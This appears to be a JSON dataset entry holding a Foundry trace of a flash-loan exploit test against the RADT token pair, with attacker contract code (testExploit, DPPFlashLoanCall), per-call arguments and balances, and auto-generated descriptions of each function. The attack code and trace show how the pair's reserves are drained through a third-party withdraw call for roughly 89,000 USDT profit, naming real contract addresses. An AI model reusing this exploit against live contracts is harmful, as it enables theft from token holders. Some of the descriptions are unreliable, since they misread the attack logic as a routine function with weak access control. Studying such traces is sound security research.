@@ -1,0 +1,534 @@
+[
+    {
+        "id": "679030",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] Attacker USDT balance before exploit\", USDT.balanceOf(address(this)), 18);\n\n        USDT.approve(address(Router), ~uint256(0));\n        RADT.approve(address(Router), ~uint256(0));\n        IDODO(dodo).flashLoan(0, 200_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate an attack or exploit scenario. It starts by logging the attacker's USDT balance before the exploit. Then, it approves the Router contract to spend an unlimited amount of USDT and RADT tokens on behalf of the attacker. After that, it triggers a flash loan from the DODO contract, borrowing a large amount of tokens. Finally, it logs the attacker's USDT balance after the exploit to show the impact of the operation.\n\n2. **Security mechanism**:  \n   The function uses `approve` to grant the Router contract permission to spend USDT and RADT tokens. The `~uint256(0)` value represents the maximum possible allowance, effectively giving unlimited spending power. The `flashLoan` function is called from the DODO contract, which is a common DeFi mechanism for borrowing and repaying tokens within a single transaction. However, there are no explicit security checks or modifiers in this function, which could make it vulnerable to misuse or unintended consequences.\n\n3. **Parameter Function**:  \n   - `USDT.approve(address(Router), ~uint256(0))`: Grants the Router contract unlimited permission to spend USDT tokens.  \n   - `RADT.approve(address(Router), ~uint256(0))`: Grants the Router contract unlimited permission to spend RADT tokens.  \n   - `IDODO(dodo).flashLoan(0, 200_000 * 1e18, address(this), new bytes(1))`: Initiates a flash loan from the DODO contract, borrowing 200,000 tokens (scaled to 18 decimal places) and passing the attacker's address and an empty byte array as parameters.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it emits two log events:  \n   - The first log shows the attacker's USDT balance before the exploit.  \n   - The second log shows the attacker's USDT balance after the exploit.  \n   The difference between these two balances indicates the success or impact of the exploit.  \n\nIn summary, the `testExploit` function simulates an attack by leveraging flash loans and token approvals. It logs the attacker's USDT balance before and after the exploit to demonstrate the outcome. However, the lack of explicit security measures could make this function risky in a real-world scenario.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "24562",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24642",
+        "args": "0x10ED43C718714eb63d5aA57B78B54704E256024E, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "601764",
+        "args": "0, 200000000000000000000000 [2e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": "    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address assetTo,\n        bytes calldata data\n    ) external preventReentrant {\n        _transferBaseOut(assetTo, baseAmount);\n        _transferQuoteOut(assetTo, quoteAmount);\n\n        if (data.length > 0)\n            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);\n\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));\n\n        // no input -> pure loss\n        require(\n            baseBalance >= _BASE_RESERVE_ || quoteBalance >= _QUOTE_RESERVE_,\n            \"FLASH_LOAN_FAILED\"\n        );\n\n        // sell quote case\n        // quote input + base output\n        if (baseBalance < _BASE_RESERVE_) {\n            uint256 quoteInput = quoteBalance.sub(uint256(_QUOTE_RESERVE_));\n            (\n                uint256 receiveBaseAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newQuoteTarget\n            ) = querySellQuote(tx.origin, quoteInput); // revert if quoteBalance<quoteReserve\n            require(uint256(_BASE_RESERVE_).sub(baseBalance) <= receiveBaseAmount, \"FLASH_LOAN_FAILED\");\n\n            _transferBaseOut(_MAINTAINER_, mtFee);\n            if (_RState_ != uint32(newRState)) {\n                require(newQuoteTarget <= uint112(-1),\"OVERFLOW\");\n                _QUOTE_TARGET_ = uint112(newQuoteTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_QUOTE_TOKEN_),\n                address(_BASE_TOKEN_),\n                quoteInput,\n                receiveBaseAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        // sell base case\n        // base input + quote output\n        if (quoteBalance < _QUOTE_RESERVE_) {\n            uint256 baseInput = baseBalance.sub(uint256(_BASE_RESERVE_));\n            (\n                uint256 receiveQuoteAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newBaseTarget\n            ) = querySellBase(tx.origin, baseInput); // revert if baseBalance<baseReserve\n            require(uint256(_QUOTE_RESERVE_).sub(quoteBalance) <= receiveQuoteAmount, \"FLASH_LOAN_FAILED\");\n\n            _transferQuoteOut(_MAINTAINER_, mtFee);\n            if (_RState_ != uint32(newRState)) {\n                require(newBaseTarget <= uint112(-1),\"OVERFLOW\");\n                _BASE_TARGET_ = uint112(newBaseTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_BASE_TOKEN_),\n                address(_QUOTE_TOKEN_),\n                baseInput,\n                receiveQuoteAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        _sync();\n        \n        emit DODOFlashLoan(msg.sender, assetTo, baseAmount, quoteAmount);\n    }\n\n    // ============ Query Functions ============\n\n",
+        "description": "1. Core functions:\nThe `flashLoan` function is designed to facilitate a flash loan, which is a type of loan where the borrowed funds must be returned within the same transaction. This function allows a user to borrow two types of tokens (`baseAmount` and `quoteAmount`) and send them to a specified address (`assetTo`). After the loan is issued, the function checks if the user has returned the tokens or made a profit by trading them. If the user fails to return the tokens or the trading results in a loss, the transaction is reverted to prevent financial loss to the system.\n\n2. Security mechanism:\nThe function includes several security measures to ensure safe operation:\n- **`preventReentrant` modifier**: This prevents reentrancy attacks, where a malicious contract could call the function repeatedly before the first call completes, potentially draining funds.\n- **Balance checks**: The function checks the balances of the base and quote tokens after the loan is issued to ensure that the user has returned the tokens or made a profit.\n- **Require statements**: These ensure that the conditions for a successful flash loan are met, such as having sufficient token balances after the loan.\n- **Event emissions**: Events like `DODOSwap` and `DODOFlashLoan` are emitted to log important actions, providing transparency and traceability.\n\n3. Parameter Function:\n- **`baseAmount`**: The amount of the base token to be loaned.\n- **`quoteAmount`**: The amount of the quote token to be loaned.\n- **`assetTo`**: The address to which the loaned tokens will be sent.\n- **`data`**: Additional data that can be passed to the recipient contract, allowing for custom logic to be executed after receiving the loan.\n\n4. Return description:\nThe function does not return a value directly. Instead, it performs several checks and actions:\n- It transfers the loaned tokens to the specified address.\n- It calls a function on the recipient contract if `data` is provided.\n- It checks the balances of the tokens after the loan to ensure they meet the required conditions.\n- It handles cases where the user trades the tokens, updating the system state and emitting events accordingly.\n- Finally, it syncs the system state and emits a `DODOFlashLoan` event to log the transaction.\n\nIn summary, the `flashLoan` function enables users to borrow tokens temporarily, with built-in checks to ensure the loan is repaid or profitable. It includes security measures to prevent misuse and provides transparency through event logging.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "599065",
+        "args": "0, 200000000000000000000000 [2e23], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "27971",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 200000000000000000000000 [2e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "521215",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 200000000000000000000000 [2e23], 0x00",
+        "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        buyRADT();\n        USDT.transfer(address(pair), 1);\n        uint256 amount = RADT.balanceOf(address(pair)) * 100 / 9;\n        wrap.withdraw(address(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), address(pair), amount);\n        pair.sync();\n        sellRADT();\n        USDT.transfer(address(dodo), 200_000 * 1e18);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to handle a flash loan operation, which is a type of short-term borrowing commonly used in decentralized finance (DeFi). It performs a series of actions:  \n   - It calls a function `buyRADT()` to purchase a specific token (RADT).  \n   - It transfers a small amount of USDT to a trading pair contract (`pair`).  \n   - It calculates an amount of RADT based on the balance in the trading pair and performs a withdrawal operation using the `wrap.withdraw` function.  \n   - It synchronizes the trading pair's reserves using `pair.sync()`.  \n   - It sells the RADT tokens by calling `sellRADT()`.  \n   - Finally, it transfers a large amount of USDT to another address (`dodo`).  \n\n2. **Security mechanism:**  \n   - The function uses the `external` modifier, meaning it can only be called from outside the contract, not internally.  \n   - The function does not include explicit access control (e.g., `onlyOwner`), which could be a security risk if unauthorized users can trigger it.  \n   - The use of `pair.sync()` ensures that the trading pair's reserves are updated, which is important for maintaining accurate pricing and preventing manipulation.  \n   - The function relies on external contracts (e.g., `USDT`, `RADT`, `wrap`, `pair`, `dodo`), so its security depends on the trustworthiness of these contracts.  \n\n3. **Parameter Function:**  \n   - `sender`: Represents the address initiating the flash loan. It is not used in the function, which could be a missed opportunity for logging or validation.  \n   - `baseAmount` and `quoteAmount`: These parameters likely represent the amounts of two tokens involved in the flash loan. However, they are not used in the function, which might indicate incomplete implementation or a placeholder for future logic.  \n   - `data`: This parameter is intended to pass additional information, but it is not utilized in the function.  \n\n4. **Return description:**  \n   The function does not return any value (it has no `return` statement). It performs a series of actions but does not provide any output or result to the caller.  \n\n**In summary,**  \nThis function handles a flash loan operation by purchasing and selling tokens, transferring funds, and synchronizing a trading pair. However, it lacks explicit security measures like access control and does not use its parameters effectively. Its safety depends on the trustworthiness of external contracts it interacts with.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "183952",
+        "args": "1000000000000000000000 [1e21], 0, [0x55d398326f99059fF775485246999027B3197955, 0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1663905800 [1.663e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10834",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 1000000000000000000000 [1e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2563",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "94453473060895791601540 [9.445e22], 8163658010724952139310 [8.163e21], 1663905794 [1.663e9]"
+    },
+    {
+        "id": "531",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601540 [9.545e22]"
+    },
+    {
+        "id": "156926",
+        "args": "0, 85313419073296524387 [8.531e19], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "122520",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 85313419073296524387 [8.531e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "89555",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 85313419073296524387 [8.531e19]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "84712",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 85313419073296524387 [8.531e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601540 [9.545e22]"
+    },
+    {
+        "id": "563",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "8078344591651655614923 [8.078e21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "94453473060895791601540 [9.445e22], 8163658010724952139310 [8.163e21], 1663905794 [1.663e9]"
+    },
+    {
+        "id": "563",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "85313419073296524387 [8.531e19]"
+    },
+    {
+        "id": "8084",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xf8041b0E56a99f647C040dA6C83ff28330673B4D, 853134190732965243 [8.531e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8084",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x8e1DBE98c35909877004cBB381360d77A6784591, 5971939335130756706 [5.971e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2537",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "563",
+        "args": "0x8e1DBE98c35909877004cBB381360d77A6784591",
+        "original_code": null,
+        "description": null,
+        "return_value": "153830298552680635201307 [1.538e23]"
+    },
+    {
+        "id": "531",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601540 [9.545e22]"
+    },
+    {
+        "id": "563",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "8078344591651655614923 [8.078e21]"
+    },
+    {
+        "id": "563",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "78488345547432802438 [7.848e19]"
+    },
+    {
+        "id": "3271",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "563",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "8078344591651655614923 [8.078e21]"
+    },
+    {
+        "id": "148232",
+        "args": "0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE, 0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 89759384351685062388033 [8.975e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "147889",
+        "args": "0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE, 0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 89759384351685062388033 [8.975e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601541 [9.545e22]"
+    },
+    {
+        "id": "563",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "8078344591651655614923 [8.078e21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601540 [9.545e22], 8078344591651655614923 [8.078e21], 1663905800 [1.663e9]"
+    },
+    {
+        "id": "2395",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "771084437533614376388993871504910532570047377 [7.71e44]"
+    },
+    {
+        "id": "2439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "27627784432969699002606 [2.762e22]"
+    },
+    {
+        "id": "2537",
+        "args": "0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE",
+        "original_code": null,
+        "description": null,
+        "return_value": "313050982470623100407 [3.13e20]"
+    },
+    {
+        "id": "2563",
+        "args": "0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE",
+        "original_code": null,
+        "description": null,
+        "return_value": "4306713393664669460 [4.306e18]"
+    },
+    {
+        "id": "6084",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE, 893287130123185954420 [8.932e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8084",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 0x410A6aC91D7B7f6b34444276d43A48D850B6786D, 897593843516850623880 [8.975e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8084",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 0x727F993bf1e276683A997034823fEd3aDd2a3CED, 448796921758425311940 [4.487e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8084",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 0xC42Fc51d58F66A56C03468b6e0691FBD0918eA6E, 224398460879212655970 [2.243e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3284",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 0xf8041b0E56a99f647C040dA6C83ff28330673B4D, 897593843516850623880 [8.975e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3284",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 0x8e1DBE98c35909877004cBB381360d77A6784591, 4712367678463465775371 [4.712e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9006",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601541 [9.545e22]"
+    },
+    {
+        "id": "563",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "4306713393664669462 [4.306e18]"
+    },
+    {
+        "id": "563",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "78488345547432802438 [7.848e19]"
+    },
+    {
+        "id": "153156",
+        "args": "78488345547432802438 [7.848e19], 0, [0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1663905800 [1.663e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "125053",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 78488345547432802438 [7.848e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "120802",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 78488345547432802438 [7.848e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "120459",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 78488345547432802438 [7.848e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "531",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601541 [9.545e22]"
+    },
+    {
+        "id": "563",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "82795058941097471900 [8.279e19]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601541 [9.545e22], 4306713393664669462 [4.306e18], 1663905800 [1.663e9]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601541 [9.545e22], 4306713393664669462 [4.306e18], 1663905800 [1.663e9]"
+    },
+    {
+        "id": "563",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "23184",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 784883455474328024 [7.848e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3284",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 0xf8041b0E56a99f647C040dA6C83ff28330673B4D, 784883455474328024 [7.848e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3284",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e, 0x8e1DBE98c35909877004cBB381360d77A6784591, 5494184188320296169 [5.494e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "537",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "198999999999999999999999 [1.989e23]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "95453473060895791601541 [9.545e22], 4306713393664669462 [4.306e18], 1663905800 [1.663e9]"
+    },
+    {
+        "id": "563",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "75731107841828519683 [7.573e19]"
+    },
+    {
+        "id": "18393",
+        "args": "90012349392513312896022 [9.001e22], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3271",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 90012349392513312896022 [9.001e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "5441123668382478705519 [5.441e21]"
+    },
+    {
+        "id": "563",
+        "args": "0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e",
+        "original_code": null,
+        "description": null,
+        "return_value": "75731107841828519683 [7.573e19]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "289012349392513312896021 [2.89e23]"
+    },
+    {
+        "id": "3271",
+        "args": "0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f, 200000000000000000000000 [2e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2534",
+        "args": "0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f",
+        "original_code": null,
+        "description": null,
+        "return_value": "2632076641781857610503 [2.632e21]"
+    },
+    {
+        "id": "531",
+        "args": "0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f",
+        "original_code": null,
+        "description": null,
+        "return_value": "243673213068049612594655 [2.436e23]"
+    },
+    {
+        "id": "534",
+        "args": "0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f",
+        "original_code": null,
+        "description": null,
+        "return_value": "2632076641781857610503 [2.632e21]"
+    },
+    {
+        "id": "531",
+        "args": "0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f",
+        "original_code": null,
+        "description": null,
+        "return_value": "243673213068049612594655 [2.436e23]"
+    },
+    {
+        "id": "531",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "89012349392513312896021 [8.901e22]"
+    }
+]
